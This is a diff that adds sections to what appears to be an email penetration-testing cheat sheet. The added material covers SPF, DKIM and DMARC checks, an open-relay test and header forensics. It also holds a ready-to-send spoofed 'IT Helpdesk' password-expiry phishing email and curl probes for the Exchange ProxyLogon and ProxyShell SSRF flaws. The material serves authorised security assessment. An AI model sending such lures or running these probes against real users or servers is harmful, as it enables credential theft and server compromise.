@@ -882,3 +882,166 @@ nailgun -h mail.target.com -p 587 -auth login:user:password
 # Test SMTP throughput
 nailgun -h mail.target.com -p 25 -t 5
 ```
+
+---
+
+## 10. Comprehensive Email Authentication Analysis
+
+### SPF/DKIM/DMARC Combined Assessment Script
+
+```bash
+#!/bin/bash
+# Full email authentication posture assessment
+DOMAIN=$1
+
+echo "=== Email Authentication Assessment: $DOMAIN ==="
+echo ""
+
+echo "[1] SPF Record Analysis"
+spf_record=$(dig TXT $DOMAIN +short | grep v=spf)
+if [ -n "$spf_record" ]; then
+    echo "  SPF: $spf_record"
+    # Check for ~all (softfail) vs -all (hardfail) vs +all (allow all)
+    if echo "$spf_record" | grep -q '\+all'; then
+        echo "  [CRITICAL] SPF allows all senders (+all)"
+    elif echo "$spf_record" | grep -q '\~all'; then
+        echo "  [MEDIUM] SPF softfail (~all) - not enforced"
+    elif echo "$spf_record" | grep -q '\-all'; then
+        echo "  [OK] SPF hardfail (-all) - properly enforced"
+    fi
+    # Check DNS lookup limit
+    include_count=$(echo "$spf_record" | grep -o 'include:' | wc -l)
+    echo "  Include chains: $include_count (limit: 10)"
+else
+    echo "  [CRITICAL] No SPF record found"
+fi
+echo ""
+
+echo "[2] DMARC Record Analysis"
+dmarc=$(dig TXT _dmarc.$DOMAIN +short)
+if [ -n "$dmarc" ]; then
+    echo "  DMARC: $dmarc"
+    if echo "$dmarc" | grep -q 'p=none'; then
+        echo "  [HIGH] DMARC policy=none - no enforcement"
+    elif echo "$dmarc" | grep -q 'p=quarantine'; then
+        echo "  [MEDIUM] DMARC policy=quarantine"
+    elif echo "$dmarc" | grep -q 'p=reject'; then
+        echo "  [OK] DMARC policy=reject - properly enforced"
+    fi
+else
+    echo "  [HIGH] No DMARC record found"
+fi
+echo ""
+
+echo "[3] Open Relay Test"
+swaks --to test@example.com --from test@test.com --server mail.$DOMAIN --timeout 10 2>&1 | grep -E "response|250|550|relaying"
+```
+
+---
+
+## 11. Email Header Forensic Analysis
+
+### Full Header Extraction and Timeline Reconstruction
+
+```bash
+# Extract complete email headers from .eml file
+python3 -c "
+import sys
+from email import policy
+from email.parser import BytesParser
+
+with open('suspicious_email.eml', 'rb') as f:
+    msg = BytesParser(policy=policy.default).parse(f)
+
+# Print all headers in order
+for k, v in msg.items():
+    print(f'{k}: {v}')
+
+print()
+
+# Analyze Received chain (bottom-up = source to destination)
+print('=== Received Chain Analysis ===')
+received = msg.get_all('Received', [])
+for i, r in enumerate(reversed(received)):
+    print(f'  Hop {i+1}: {r[:120]}')
+"
+```
+
+### Phishing Simulation Payload Construction
+
+```bash
+# Create a realistic phishing simulation email
+swaks --to target@company.com \
+  --from "IT Helpdesk <it.helpdesk@company.com>" \
+  --server mail.company.com \
+  --header "Subject: Urgent: Password Expiration Notice" \
+  --header "X-Priority: 1" \
+  --header "Importance: high" \
+  --body-type text/html \
+  --body '<html><body>
+<style>body{font-family:Arial,sans-serif;}</style>
+<div style="max-width:600px;margin:0 auto;padding:20px;">
+<h2 style="color:#0078d4;">Password Expiration Notice</h2>
+<p>Your corporate password will expire in 24 hours.</p>
+<p>To avoid account lockout, please reset your password immediately:</p>
+<p><a href="https://phishing-test.company.com/reset" style="background:#0078d4;color:white;padding:10px 20px;text-decoration:none;border-radius:4px;">Reset Password Now</a></p>
+<p style="color:#666;font-size:12px;">If you did not request this change, contact IT Support.</p>
+</div></body></html>' \
+  --add-header "X-Mailer: Microsoft Outlook 16.0" \
+  --add-header "Thread-Topic: Password Reset" \
+  --add-header "Thread-Index: AQHRandomBase64String=="
+
+# Log the test for engagement evidence
+echo "$(date -u +%Y-%m-%dT%H:%M:%SZ) - Phishing simulation sent to target@company.com" >> phishing_log.txt
+```
+
+### Microsoft Exchange ProxyShell/ProxyLogon Detection
+
+```bash
+# Check for ProxyLogon (CVE-2021-26855) via SSRF
+curl -s -o /dev/null -w "%{http_code}" \
+  "https://mail.target.com/owa/auth/logon.aspx" \
+  -H "Cookie: X-BEResource=localhost~443/powershell?serializationLevel=Full"
+
+# Check for ProxyShell (CVE-2021-34473) via SSRF
+curl -s "https://mail.target.com/autodiscover/autodiscover.json?@foo.com/mapi/nspi/" \
+  -H "Content-Type: application/json" \
+  -d '{"Email":"admin@target.com"}'
+
+# Enumerate Exchange server version for known CVEs
+curl -s -I https://mail.target.com/owa/ | grep -iE "server|x-powered-by|x-aspnet"
+
+# Check for CVE-2021-26857 (Unified Messaging exploit)
+curl -s -X POST https://mail.target.com/owa/auth/logon.aspx \
+  -H "Content-Type: application/json" \
+  -d '{"legacyDN":"/o=First Organization/ou=Exchange Administrative Group/cn=Recipients/cn=admin","subject":"test"}' \
+  -o /dev/null -w "%{http_code}"
+```
+
+### Email Header Forensic Analysis
+
+```bash
+# Extract and analyze email headers for SPF/DKIM/DMARC failures
+python3 -c "
+import re
+
+headers = open('email_headers.txt').read()
+
+# Check SPF
+spf = re.search(r'Received-SPF:\s*(\w+)', headers)
+print(f'SPF Status: {spf.group(1) if spf else \"Not found\"}')
+
+# Check DKIM
+dkim = re.search(r'dkim=(\w+)', headers, re.IGNORECASE)
+print(f'DKIM Status: {dkim.group(1) if dkim else \"Not found\"}')
+
+# Check DMARC
+dmarc = re.search(r'dmarc=(\w+)', headers, re.IGNORECASE)
+print(f'DMARC Status: {dmarc.group(1) if dmarc else \"Not found\"}')
+
+# Extract Received chain for path analysis
+received = re.findall(r'from\s+([\w\.\-]+)\s+by\s+([\w\.\-]+)', headers)
+for i, (src, dst) in enumerate(reversed(received)):
+    print(f'  Hop {i+1}: {src} -> {dst}')
+"
+```
